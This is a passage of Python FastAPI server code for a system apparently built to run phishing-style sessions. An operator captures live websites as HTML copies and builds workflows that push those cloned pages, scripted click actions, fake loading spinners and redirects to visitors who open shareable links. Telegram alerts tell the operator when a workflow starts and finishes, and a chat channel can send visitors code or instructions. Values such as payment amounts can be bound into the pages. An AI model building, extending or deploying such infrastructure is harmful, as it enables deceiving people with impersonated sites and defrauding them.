            return JSONResponse({"error": "invalid JSON"}, status_code=400)
        if not isinstance(body, dict):
            return JSONResponse({"error": "expected JSON object"}, status_code=400)
        html = body.get("html") or ""
        if "description" in body:
            description = str(body.get("description") or "")
        if isinstance(body.get("tags"), list):
            tags = body["tags"]
    else:
        try:
            form = await request.form()
        except Exception:
            return JSONResponse({"error": "expected JSON or form data"}, status_code=400)
        html = form.get("html") or ""
        upload = form.get("file")
        if not html and upload is not None and hasattr(upload, "read"):
            raw = await upload.read()
            html = raw.decode("utf-8", "replace") if isinstance(raw, bytes) else str(raw)
    if not isinstance(html, str) or not html.strip():
        return JSONResponse({"error": "html is required"}, status_code=400)
    try:
        clean = _sanitize_lpv_html(html)
        saved = lpv_store.replace_page_html(
            page_id, clean, description=description, tags=tags
        )
    except ValueError as exc:
        return JSONResponse({"error": str(exc)}, status_code=400)
    except Exception as exc:
        logger.error("lpv replace html error: %s", exc)
        return JSONResponse({"error": str(exc)}, status_code=500)
    if not saved:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"page": saved, "replaced": True}


@app.get("/api/lpv/pages/{page_id}/actions")
async def lpv_page_actions_get(page_id: str, request: Request):
    """A page's click actions (admin)."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {
        "page_id": page_id,
        "actions": lpv_store.normalise_actions(page.get("actions")),
    }


@app.put("/api/lpv/pages/{page_id}/actions")
async def lpv_page_actions_put(page_id: str, request: Request):
    """Replace a page's click actions.

    Body: {"actions": [{"match": "text:Sign in", "do": "page",
                        "page_id": "<page id>"} | {"match": ".next",
                        "do": "link", "url": "https://example.com"}]}

    ``match`` is the same rule syntax as the click guard, so an operator who
    has locked a page already knows how to address a control.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    actions = (body or {}).get("actions") if isinstance(body, dict) else None
    if actions is None:
        return JSONResponse({"error": "actions[] required"}, status_code=400)
    if not isinstance(actions, list):
        return JSONResponse({"error": "actions must be a list"}, status_code=400)
    clean = lpv_store.normalise_actions(actions)
    missing = []
    for rule in clean:
        if rule["do"] == "page" and not lpv_store.get_page(rule["page_id"]):
            missing.append(rule.get("page_name") or rule["page_id"])
    if missing:
        return JSONResponse(
            {"error": "page not found: " + ", ".join(missing)}, status_code=400
        )
    saved = lpv_store.set_page_actions(page_id, clean)
    if saved is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    # Anyone already looking at this page gets the new mappings at once.
    live = await _push_actions_to_viewers(page_id, saved)
    return {"success": True, "actions": saved, "count": len(saved), "live": live}


@app.get("/api/lpv/archive/{page_id}/versions")
async def lpv_archive_versions(page_id: str):
    versions = lpv_store.list_versions(page_id)
    return {"versions": versions}


@app.get("/api/lpv/archive/{page_id}/versions/{version}")
async def lpv_archive_version_html(page_id: str, version: int):
    html = lpv_store.read_version_html(page_id, version)
    if html is None:
        return JSONResponse({"error": "version not found"}, status_code=404)
    return HTMLResponse(content=html, media_type="text/html; charset=utf-8")


@app.post("/api/lpv/archive/{page_id}/restore/{version}")
async def lpv_archive_restore(page_id: str, version: int):
    page = lpv_store.restore_version(page_id, version)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"page": page}


# ----- Round 2: redaction rules -----

@app.get("/api/lpv/redaction/{client_id}")
async def lpv_redaction_list(client_id: str):
    return {"rules": lpv_store.list_redaction(client_id)}


@app.post("/api/lpv/redaction/{client_id}")
async def lpv_redaction_set(client_id: str, request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    selector = (body.get("selector") or "").strip()
    field = (body.get("field") or "").strip()
    action = (body.get("action") or "mask").strip()
    if not selector or not field:
        return JSONResponse({"error": "selector and field are required"}, status_code=400)
    try:
        lpv_store.set_redaction(client_id, selector, field, action)
    except ValueError as ve:
        return JSONResponse({"error": str(ve)}, status_code=400)
    return {"rules": lpv_store.list_redaction(client_id)}


@app.delete("/api/lpv/redaction/{client_id}")
async def lpv_redaction_delete(client_id: str, request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    selector = (body.get("selector") or "").strip()
    field = (body.get("field") or "").strip()
    if not selector or not field:
        return JSONResponse({"error": "selector and field are required"}, status_code=400)
    lpv_store.delete_redaction(client_id, selector, field)
    return {"rules": lpv_store.list_redaction(client_id)}


# ----- Round 2: workflows -----

@app.get("/api/lpv/workflows")
async def lpv_workflows_list():
    return {"workflows": lpv_store.list_workflows()}


@app.get("/api/lpv/workflows/{workflow_id}")
async def lpv_workflow_get(workflow_id: str):
    wf = lpv_store.get_workflow(workflow_id)
    if not wf:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"workflow": wf}


@app.post("/api/lpv/workflows")
async def lpv_workflow_save(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    try:
        wf = lpv_store.save_workflow(
            body.get("id"),
            body.get("name") or "",
            body.get("description") or "",
            body.get("steps") or [],
            # Passing None (absent key) keeps the previous value on update.
            brand_logo_url=body.get("brand_logo_url") if "brand_logo_url" in body else None,
            brand_color=body.get("brand_color") if "brand_color" in body else None,
            respect_redirect=body.get("respect_redirect") if "respect_redirect" in body else None,
            redirect_html=body.get("redirect_html") if "redirect_html" in body else None,
            redirect_page_id=body.get("redirect_page_id") if "redirect_page_id" in body else None,
        )
    except ValueError as ve:
        return JSONResponse({"error": str(ve)}, status_code=400)
    return {"workflow": wf}


@app.delete("/api/lpv/workflows/{workflow_id}")
async def lpv_workflow_delete(workflow_id: str):
    ok = lpv_store.delete_workflow(workflow_id)
    if not ok:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"deleted": workflow_id}


# ===========================================================================
# Custom redirect / loading page for a workflow
# ===========================================================================

@app.get("/api/lpv/workflows/{workflow_id}/redirect.html")
async def lpv_workflow_redirect_html(workflow_id: str):
    """Serve the workflow's custom loading page as a raw HTML document.

    This is what client.html renders instead of the built-in LPV spinner
    while a redirect step (or any page load) is in flight. Returns 404
    when the workflow has no custom page, which the client treats as
    "fall back to the built-in spinner".
    """
    wf = lpv_store.get_workflow(workflow_id)
    if not wf:
        return JSONResponse({"error": "workflow not found"}, status_code=404)
    raw = (wf.get("redirect_html") or "").strip()
    if not raw:
        return JSONResponse(
            {"error": "workflow has no custom redirect page"}, status_code=404
        )
    return HTMLResponse(
        content=raw,
        media_type="text/html; charset=utf-8",
        headers={"Cache-Control": "no-cache, must-revalidate"},
    )


# ===========================================================================
# Live chat
# ===========================================================================

_CHAT_LOGO_DIR = Path(__file__).parent / "data" / "chat"


@app.get("/api/lpv/chat/threads")
async def chat_threads_list(request: Request):
    """One row per client that has ever chatted, newest activity first."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        return {"threads": lpv_store.chat_threads()}
    except Exception as exc:
        logger.error("chat threads error: %s", exc)
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.get("/api/lpv/chat/logo/{filename}")
async def chat_logo_serve(filename: str):
    """Serve an uploaded chat logo."""
    safe = Path(filename).name
    path = _CHAT_LOGO_DIR / safe
    if not path.exists():
        return JSONResponse({"error": "not found"}, status_code=404)
    ctype = mimetypes.guess_type(safe)[0] or "image/png"
    return FileResponse(
        path, media_type=ctype,
        headers={"Cache-Control": "public, max-age=31536000"},
    )


@app.post("/api/lpv/chat/logo")
async def chat_logo_upload(request: Request):
    """Set the chat header logo.

    Accepts either JSON { "url": "https://…" } for a hosted logo, or
    multipart/form-data with a "file" field to upload one. Uploaded files
    land in data/chat/ and are served from /api/lpv/chat/logo/<name>.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    ctype = (request.headers.get("content-type") or "").lower()
    if "application/json" in ctype:
        try:
            payload = await request.json()
        except Exception:
            payload = {}
        url = str((payload or {}).get("url") or "").strip()
        if not url:
            return JSONResponse({"error": "url is required"}, status_code=400)
        if not url.lower().startswith(("http://", "https://", "/")):
            return JSONResponse(
                {"error": "url must be http(s) or a root-relative path"},
                status_code=400,
            )
        await srv_settings.update_setting("chat_logo_url", url)
        return {"success": True, "logo_url": url}
    try:
        form = await request.form()
        up = form.get("file") or form.get("logo")
        if up is None:
            return JSONResponse({"error": "file field is required"}, status_code=400)
        raw = await up.read()
        if not raw:
            return JSONResponse({"error": "empty file"}, status_code=400)
        if len(raw) > 2 * 1024 * 1024:
            return JSONResponse(
                {"error": "logo must be 2 MB or smaller"}, status_code=400
            )
        ext = Path(getattr(up, "filename", "") or "logo").suffix.lower()
        if ext not in (".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"):
            ext = ".png"
        _CHAT_LOGO_DIR.mkdir(parents=True, exist_ok=True)
        fname = f"logo-{uuid.uuid4().hex[:12]}{ext}"
        (_CHAT_LOGO_DIR / fname).write_bytes(raw)
        url = f"/api/lpv/chat/logo/{fname}"
        await srv_settings.update_setting("chat_logo_url", url)
        return {"success": True, "logo_url": url}
    except Exception as exc:
        logger.error("chat logo upload error: %s", exc)
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.get("/api/lpv/chat/{client_id}")
async def chat_history(client_id: str, request: Request):
    """Full message history for one client, oldest first."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    ident = _lpv_identity_for(client_id)
    try:
        return {
            "client_id": client_id,
            "identity_key": ident,
            "messages": lpv_store.chat_list(client_id, identity_key=ident or None),
        }
    except Exception as exc:
        logger.error("chat history error: %s", exc)
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.post("/api/lpv/chat/{client_id}/send")
async def chat_send_rest(client_id: str, request: Request):
    """HTTP fallback for sending a chat message (the admin WS also offers
    `chat_send`; this exists so a console without a live socket can post)."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    kind = str(body.get("kind") or "text").strip().lower()
    if kind not in ("text", "code", "instruction"):
        kind = "text"
    text = str(body.get("body") or "").strip()
    code = str(body.get("code") or "")
    if kind == "text" and not text:
        return JSONResponse({"error": "message is empty"}, status_code=400)
    try:
        row = lpv_store.chat_add(
            client_id, "admin", body=text, kind=kind, code=code,
            identity_key=_lpv_identity_for(client_id) or None,
        )
    except ValueError as ve:
        return JSONResponse({"error": str(ve)}, status_code=400)
    except Exception as exc:
        return JSONResponse({"error": str(exc)}, status_code=500)
    await _broadcast_chat(row)
    delivered = await _send_to_client(client_id, {"type": "chat_message", **row})
    return {"message": row, "delivered": delivered}


@app.delete("/api/lpv/chat/{client_id}")
async def chat_clear_thread(client_id: str, request: Request):
    """Wipe a client's chat history."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    ident = _lpv_identity_for(client_id)
    removed = lpv_store.chat_clear(client_id, identity_key=ident or None)
    return {"cleared": client_id, "identity_key": ident, "removed": removed}


# ----- Round 2: workflow execution (admin -> client chain) -----

async def _run_workflow_on_client(
    client_id: str, workflow: dict,
    connection_token: Optional[str] = None,
    workflow_token: Optional[str] = None,
    bindings: Optional[Dict[str, str]] = None,
) -> None:
    """Push each step of a workflow to a client with delays between
    pushes. This runs as a background task so the WS ack returns
    immediately. We use `_send_to_client` so a dead client cleanly
    aborts the chain without raising.

    Semantics (redirect is spinner body, not a page + goto is real nav):
      page     -> push page_id to client (lpv_show_page)
      redirect -> LVP spinner body that appears AFTER a submit/button
                  click in client.html (#lpv-spinner / lpv_spinner event).
                  It waits FOREVER for the client's spinner signal then
                  sleeps wait_seconds before the next page. No timeout —
                  only client disconnect aborts (per user request).
      goto     -> actual browser navigation to url (http://www.google.com) via page.goto or navigate message
      wait     -> plain sleep sleep_seconds
    """
    if not _lpv_connection_is_current(client_id, connection_token):
        logger.warning(
            "[workflow] %s: not started - the client connection was replaced "
            "or closed before the chain began", client_id,
        )
        return
    if not _workflow_is_current(client_id, workflow_token):
        logger.warning(
            "[workflow] %s: not started - a newer workflow superseded this one",
            client_id,
        )
        return
    steps = workflow.get("steps") or []
    # Per-workflow behavior: when False, redirect steps degrade to a plain
    # timed wait (the "respect redirect logic" toggle in the editor).
    respect_redirect = workflow.get("respect_redirect", True)
    # Tell the client this chain's branding so it can paint the branded
    # loading screen (custom logo + spinner color) until the first push.
    try:
        await _send_to_client(client_id, {
            "type": "lpv_workflow_branding",
            "workflow_id": workflow.get("id"),
            "workflow_name": workflow.get("name") or "",
            "brand_logo_url": workflow.get("brand_logo_url") or "",
            "brand_color": workflow.get("brand_color") or "",
            "respect_redirect": bool(respect_redirect),
            # Non-empty => client renders this instead of its own spinner.
            "redirect_html_url": _chat_redirect_url(workflow),
        }, connection_token=connection_token)
    except Exception:
        pass
    tg_notify(
        "\U0001F680 <b>WORKFLOW STARTED</b>\n\n"
        + _tg_tree([
            ("\U0001F4CB", "Workflow", _tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)),
            ("\U0001F522", "Steps", str(len(workflow.get('steps') or []))),
            ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
        ]),
        "notify_lpv_workflow",
    )
    # Track last pushed page so redirect events have a page context.
    last_page_id = None
    last_page_name = None
    try:
        sess = lpv_store.get_session(client_id)
        if sess:
            last_page_id = sess.get("current_page_id")
            last_page_name = sess.get("current_page_name")
    except Exception:
        pass
    for i, step in enumerate(steps):
        if not _lpv_connection_is_current(client_id, connection_token):
            return
        kind = step.get("kind")
        if kind == "page":
            requested_page_id = step.get("page_id")
            # One step, one page id — but a page can pair a mobile and a
            # desktop build, so resolve which one THIS visitor receives.
            if requested_page_id:
                page, page_id, _step_device = await _page_for_client(
                    client_id, requested_page_id
                )
            else:
                page, page_id = None, requested_page_id
            if not page:
                lpv_store.record_event(
                    client_id, "workflow_step_skipped",
                    {"workflow_id": workflow.get("id"), "step": i,
                     "kind": kind, "reason": "page_missing"},
                )
                continue
            # Values typed for this run apply to every page step that has a
            # binding of that name; pages without those slots are untouched.
            step_values = _bind_values_for_page(page_id, bindings)
            bind_token = _bind_token_for(page_id, step_values) if step_values else None
            page_url = _lpv_page_url(page_id, bind_token)
            ok = await _send_to_client(client_id, {
                "type": "lpv_show_page",
                "page_id": page_id,
                "page_url": page_url,
                "page_name": page["name"],
                # Only the operator-approved controls on a locked page are
                # allowed to register a click (see client.html guardAllows).
                "guard": _page_guard(page_id, page),
                # And the controls that take the visitor somewhere.
                "actions": _page_actions(page_id, page),
            }, connection_token=connection_token)
            if not ok:
                # Client is gone (disconnected mid-chain). Log it and abort —
                # pushing into a dead socket only produces a phantom chain
                # that looks "stuck at the current page" in the audit feed.
                lpv_store.record_event(
                    client_id, "workflow_step_skipped",
                    {"workflow_id": workflow.get("id"), "step": i,
                     "kind": kind, "reason": "client_offline",
                     "page": page["name"]},
                    page_id=page_id, page_name=page["name"],
                )
                logger.debug(f"[workflow] client {client_id} offline at page step {i}, aborting chain")
                break
            if ok:
                lpv_store.set_current_page(client_id, page_id, page["name"])
                last_page_id = page_id
                last_page_name = page["name"]
                lpv_store.record_event(
                    client_id, "workflow_step",
                    {"workflow_id": workflow.get("id"), "step": i,
                     "kind": kind, "page": page["name"]},
                    page_id=page_id, page_name=page["name"],
                )
                await _broadcast_lpv_event(client_id, {
                    "event_type": "workflow_step",
                    "page_id": page_id,
                    "page_name": page["name"],
                    "payload": {"workflow_id": workflow.get("id"), "step": i,
                                "kind": kind, "total": len(steps)},
                })
        elif kind == "action":
            # Arm a click on the page the visitor is looking at. When it is
            # pressed, the target page is pushed (or the link opened). With
            # wait_seconds set, the chain pauses until that happens so the
            # next step runs on whatever the action opened.
            rule = lpv_store.normalise_action({
                "match": step.get("match"),
                "do": step.get("do"),
                "page_id": step.get("page_id"),
                "page_name": step.get("page_name"),
                "url": step.get("url"),
                "label": step.get("label"),
            })
            if not rule:
                lpv_store.record_event(
                    client_id, "workflow_step_skipped",
                    {"workflow_id": workflow.get("id"), "step": i,
                     "kind": kind, "reason": "bad_action"},
                )
                continue
            current_id = ""
            try:
                current_id = str((lpv_store.get_session(client_id) or {}).get("current_page_id") or "")
            except Exception:
                current_id = ""
            arm_id = uuid.uuid4().hex
            fired_event = asyncio.Event()
            _ARMED_ACTIONS[client_id] = {
                "id": arm_id, "rule": rule, "event": fired_event,
                "workflow_id": workflow.get("id"), "step": i,
            }
            armed = await _send_to_client(client_id, {
                "type": "lpv_arm_action",
                "id": arm_id,
                "match": rule.get("match"),
                "page_id": current_id,
                "label": rule.get("label") or "",
            }, connection_token=connection_token)
            wait_secs = max(0, min(3600, int(step.get("wait_seconds") or 0)))
            clicked = False
            if armed and wait_secs:
                try:
                    await asyncio.wait_for(fired_event.wait(), timeout=wait_secs)
                    clicked = True
                except asyncio.TimeoutError:
                    clicked = False
            lpv_store.record_event(
                client_id, "workflow_action",
                {"workflow_id": workflow.get("id"), "step": i,
                 "match": rule.get("match"), "do": rule.get("do"),
                 "armed": bool(armed), "clicked": clicked,
                 "wait_seconds": wait_secs},
            )
            await _broadcast_lpv_event(client_id, {
                "event_type": "workflow_action",
                "page_id": current_id or None,
                "page_name": (rule.get("page_name") or rule.get("url") or ""),
                "payload": {"workflow_id": workflow.get("id"), "step": i,
                            "match": rule.get("match"), "do": rule.get("do"),
                            "clicked": clicked},
            })
            # Once the chain moves on (or the wait expires) the rule is done;
            # leaving it armed would let a later click fire out of context.
            if wait_secs or not armed:
                _ARMED_ACTIONS.pop(client_id, None)
        elif kind == "goto":
            # GOTO = actual URL navigation - per user request, this MUST redirect client.html itself.
            # For browser sessions we still do server page.goto (so stream follows), but we ALSO always
            # send a navigate message to the client so client.html does window.location.href.
            url = (step.get("url") or step.get("page_url") or "").strip()
            if not url:
                lpv_store.record_event(
                    client_id, "workflow_step_skipped",
                    {"workflow_id": workflow.get("id"), "step": i,
                     "kind": kind, "reason": "missing_url"},
                )
                continue
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url
            session = None
            try:
                if session_manager:
                    session = await session_manager.get_session(client_id)
            except Exception:
                session = None
            page_obj = None
            try:
                if session and hasattr(session, 'get_active_page'):
                    page_obj = session.get_active_page()
                elif session and hasattr(session, 'page'):
                    page_obj = session.page
            except Exception:
                page_obj = None
            navigated_server = False
            navigated_client = False
            if page_obj and not getattr(page_obj, 'is_closed', lambda: False)():
                try:
                    await page_obj.goto(url, wait_until='domcontentloaded', timeout=30000)
                    navigated_server = True
                    try:
                        if hasattr(session, 'capture_remote_page'):
                            await session.capture_remote_page(reason='workflow_goto')
                    except Exception:
                        pass
                except Exception as e:
                    logger.warning(f"[workflow] goto {url} failed for {client_id}: {e}")
            # Always try to redirect the actual client.html (user request: client that would be redirect)
            try:
                ok = await _send_to_client(
                    client_id, {"type": "navigate", "url": url},
                    connection_token=connection_token,
                )
                if ok:
                    navigated_client = True
            except Exception:
                pass
            # Also try goto alias for older clients
            if not navigated_client:
                try:
                    ok2 = await _send_to_client(
                        client_id, {"type": "goto", "url": url},
                        connection_token=connection_token,
                    )
                    if ok2:
                        navigated_client = True
                except Exception:
                    pass
            navigated = navigated_server or navigated_client
            lpv_store.record_event(
                client_id, "workflow_goto",
                {"workflow_id": workflow.get("id"), "step": i, "url": url, "navigated": navigated},
                page_id=None, page_name=url,
            )
            await _broadcast_lpv_event(client_id, {
                "event_type": "workflow_goto",
                "page_id": None,
                "page_name": url,
                "payload": {"workflow_id": workflow.get("id"), "step": i, "url": url, "navigated": navigated},
            })
            await asyncio.sleep(0.5)
        elif kind == "redirect":
            # REDIRECT = LVP spinner body — not a page navigation.
            # Waits FOREVER for lpv_spinner signal (no timeout per user request), only disconnect aborts.
            # …unless the workflow's "respect redirect logic" toggle is OFF —
            # then it is a plain timed wait (optional redirect semantics).
            wait_for_spinner = step.get("wait_for_spinner", True)
            should_wait_spinner = bool(respect_redirect) and not (
                wait_for_spinner is False
                or wait_for_spinner == 0
                or str(wait_for_spinner).lower() in ("false", "0", "no")
            )
            if should_wait_spinner:
                # infinite wait — only disconnect wakes us
                got = await _lpv_wait_for_spinner(
                    client_id, None, connection_token=connection_token
                )
                if not _lpv_connection_is_current(client_id, connection_token):
                    return
                # After waking, verify the client is ACTUALLY still connected.
                # Workflow-link clients live in LPV-only mode and have NO
                # browser session, so a session_manager-only check falsely
                # reported "disconnected" and aborted the whole chain right
                # after step 1 (the "workflow links stop at the first
                # redirect" bug). LPV-only liveness lives in _lpv_only_ws.
                still_connected = False
                try:
                    if session_manager:
                        s = await session_manager.get_session(client_id)
                        if s is not None:
                            still_connected = True
                except Exception:
                    still_connected = False
                if not still_connected:
                    try:
                        if client_id in _lpv_only_ws:
                            still_connected = True
                    except Exception:
                        pass
                if not still_connected:
                    logger.debug(f"[workflow] client {client_id} disconnected during redirect wait, aborting workflow {workflow.get('id')}")
                    lpv_store.record_event(
                        client_id, "workflow_redirect_spinner",
                        {"workflow_id": workflow.get("id"), "step": i,
                         "page": last_page_name or "",
                         "got_spinner": False,
                         "aborted": "disconnect"},
                        page_id=last_page_id, page_name=last_page_name,
                    )
                    break
                lpv_store.record_event(
                    client_id, "workflow_redirect_spinner",
                    {"workflow_id": workflow.get("id"), "step": i,
                     "page": last_page_name or "",
                     "got_spinner": got,
                     "timeout": None},
                    page_id=last_page_id, page_name=last_page_name,
                )
                await _broadcast_lpv_event(client_id, {
                    "event_type": "workflow_redirect_spinner",
                    "page_id": last_page_id,
                    "page_name": last_page_name,
                    "payload": {"workflow_id": workflow.get("id"), "step": i,
                                "page": last_page_name or "", "got_spinner": got,
                                "timeout": None},
                })
            wait_secs = max(0, min(60, int(step.get("wait_seconds") or 0)))
            if wait_secs:
                await asyncio.sleep(wait_secs)
        elif kind == "wait":
            secs = max(0, min(60, int(step.get("sleep_seconds") or 0)))
            await asyncio.sleep(secs)
        # Yield to the loop so we don't block other handlers
        await asyncio.sleep(0.05)
    _ARMED_ACTIONS.pop(client_id, None)
    if (not _lpv_connection_is_current(client_id, connection_token)
            or not _workflow_is_current(client_id, workflow_token)):
        return
    lpv_store.record_event(
        client_id, "workflow_finished",
        {"workflow_id": workflow.get("id"), "name": workflow.get("name"), "steps": len(steps)},
    )
    await _broadcast_lpv_event(client_id, {
        "event_type": "workflow_finished",
        "page_id": None, "page_name": None,
        "payload": {"workflow_id": workflow.get("id"), "name": workflow.get("name")},
    })
    tg_notify(
        "\U0001F3C1 <b>WORKFLOW FINISHED</b>\n\n"
        + _tg_tree([
            ("\U0001F4CB", "Workflow", _tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)),
            ("\u2705", "Steps completed", str(len(steps))),
            ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
        ]),
        "notify_lpv_workflow",
    )


@app.post("/api/lpv/workflows/{workflow_id}/run/{client_id}")
async def lpv_workflow_run(workflow_id: str, client_id: str, request: Request):
    wf = lpv_store.get_workflow(workflow_id)
    if not wf:
        return JSONResponse({"error": "workflow not found"}, status_code=404)
    # We don't gate on LPV-active here: the workflow can be kicked off
    # regardless, and if the client is offline _send_to_client returns
    # False so each step just gets recorded as 'workflow_step_skipped'.
    # The audit log will tell the operator what happened.  Tracked in
    # _workflow_tasks so re-running for the same client replaces the
    # previous chain instead of interleaving two of them.
    # Optional binding values for this run: {"bindings": {"amount": "NGN 50,000"}}.
    # They are offered to every page step whose binding has that name.
    bindings: Dict[str, str] = {}
    try:
        body = await request.json()
        if isinstance(body, dict):
            bindings = _clean_bind_values(body.get("bindings"))
    except Exception:
        pass
    await _cancel_workflow_for_client(client_id, f"superseded by manual run {workflow_id}")
    _launch_workflow(client_id, wf, bindings=bindings)
    lpv_store.record_event(
        client_id, "workflow_started",
        {"workflow_id": workflow_id, "name": wf.get("name")},
    )
    return {"started": workflow_id, "client_id": client_id, "steps": len(wf.get("steps") or [])}


@app.post("/api/lpv/workflows/{workflow_id}/link")
async def lpv_workflow_link(workflow_id: str, request: Request):
    """Create a persistent workflow link that boots any opener into LPV mode and auto-starts the workflow.
    Similar to persistent_links.json / /api/links/client but carries workflow_id.
    Acceptance: any client opening the link enters LPV (lpv_only_mode + _enter_lpv_only_mode + _auto_workflow_runner).
    """
    wf = lpv_store.get_workflow(workflow_id)
    if not wf:
        return JSONResponse({"error": "workflow not found"}, status_code=404)
    # Get base_url for the link
    base_url = str(request.base_url).rstrip('/')
    # Allow optional target override from body/json/query - for workflow links the target is irrelevant,
    # the workflow itself drives the client (LPV pages + goto). We keep it empty to avoid bogus navigation.
    target = ""
    try:
        body = await request.json()
        if isinstance(body, dict):
            target = (body.get("target") or body.get("target_url") or "").strip()
    except Exception:
        pass
    if not target:
        target = request.query_params.get("target", "").strip()
    # Normalize target if provided, otherwise leave empty for workflow-driven
    clean_target = target
    if clean_target.startswith('http://'):
        clean_target = clean_target[7:]
    elif clean_target.startswith('https://'):
        clean_target = clean_target[8:]
    # For workflow links, we store a placeholder target but the final URL does NOT need a url param
    # The client will boot into LPV and the workflow will handle navigation via goto/page steps.
    link_data = create_workflow_link(workflow_id, clean_target or f"workflow:{workflow_id}")
    auth_id = link_data["auth_id"]
    # Build shareable URL - workflow param is the key, url param is optional (omit if empty to avoid https://lpv:// confusion)
    if clean_target:
        final_url = f"{base_url}/client.html?auth={auth_id}&url={quote(clean_target, safe='')}&workflow={workflow_id}"
    else:
        final_url = f"{base_url}/client.html?auth={auth_id}&workflow={workflow_id}"
    return JSONResponse({
        "success": True,
        "link": final_url,
        "auth_id": auth_id,
        "workflow_id": workflow_id,
        "target": clean_target,
        "description": "Persistent workflow link. Any client opening it boots into LPV and auto-starts this workflow."
    })


@app.get("/api/lpv/workflows/{workflow_id}/link")
async def lpv_workflow_link_get(workflow_id: str, request: Request):
    """Get existing workflow links for a workflow, or create one if none exists (idempotent helper)."""
    wf = lpv_store.get_workflow(workflow_id)
    if not wf:
        return JSONResponse({"error": "workflow not found"}, status_code=404)
    # Find any existing links for this workflow
    existing = []
    for aid, data in generated_links.items():
        if data.get("workflow_id") == workflow_id:
            base_url = str(request.base_url).rstrip('/')
            target = data.get("target_url", "")
            # target may be workflow:xxx placeholder - don't include url param if it's not a real url
            if target and not target.startswith("workflow:") and not target.startswith("lpv://"):
                final_url = f"{base_url}/client.html?auth={aid}&url={quote(target, safe='')}&workflow={workflow_id}"
            else:
                final_url = f"{base_url}/client.html?auth={aid}&workflow={workflow_id}"
            existing.append({"auth_id": aid, "link": final_url, "target_url": target, "created_at": data.get("created_at")})
    return JSONResponse({"workflow_id": workflow_id, "links": existing, "count": len(existing)})


# ==============================
# WebSocket Endpoints
# ==============================


# ==============================
# PCM - Page Creation Maker (archive page creator)
# ==============================
# Dedicated server-side browser (not a user session) that the admin
# controls via CDP screencast. Top half: URL bar + mode selector;
# bottom half: continuous screencast canvas. Capture -> SingleFile
# via extension -> save to lpv_store archive -> blob iframe preview.

@app.post("/api/pcm/open")
async def pcm_open(request: Request):
    """Open/navigate the PCM browser to a URL and optionally switch mode."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    url = (body.get("url") or body.get("target") or "").strip()
    mode = (body.get("mode") or "").strip().lower()
    if mode not in ("desktop", "mobile"):
        mode = None
    if not url:
        url = "https://www.google.com"
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    try:
        from pcm_manager import pcm_manager as _pcm
        res = await _pcm.open(url, mode=mode)
        if not res.get("ok"):
            return JSONResponse({"error": res.get("error", "open failed")}, status_code=500)
        return JSONResponse({"success": True, "url": res.get("url"), "mode": res.get("mode")})
    except Exception as e:
        logger.error(f"[PCM] open failed: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/pcm/navigate")
async def pcm_navigate(request: Request):
    """Alias for /api/pcm/open used by the admin UI Go button."""
    return await pcm_open(request)


@app.post("/api/pcm/capture")
async def pcm_capture(request: Request):
    """Capture the current PCM page as SingleFile HTML and save to archive.
    Body: { name: string, description?: string, tags?: string[] } The HTML
    itself comes from the server-side browser, not the client.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    name = (body.get("name") or "").strip()
    description = (body.get("description") or "").strip()
    tags = body.get("tags") or []
    if isinstance(tags, str):
        tags = [t.strip() for t in tags.split(",") if t.strip()]
    if not name:
        return JSONResponse({"error": "name is required"}, status_code=400)
    try:
        from pcm_manager import pcm_manager as _pcm
        # Ensure browser exists before capture
        await _pcm.ensure_browser()
        html = await _pcm.capture_html()
        if not html:
            return JSONResponse({"error": "capture failed — empty HTML"}, status_code=500)
        # Sanitize before persisting (same as LPV archive upload)
        html = _sanitize_lpv_html(html)
        page = lpv_store.save_page(name=name, html=html, description=description, tags=tags)
        logger.debug(f"[PCM] captured {name} -> {page.get('id')} {len(html)} bytes")
        return JSONResponse({"success": True, "page": page, "size": len(html)})
    except Exception as e:
        logger.error(f"[PCM] capture failed: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/pcm/refresh")
async def pcm_refresh(request: Request):
    """Hard re-bind the PCM live view: adopt the newest live page of the PCM
    browser (popups / new-tab swaps), restart the CDP screencast and push
    fresh state to all subscribers. Used by the admin Reconnect button when
    the feed is stuck on a stale tab."""
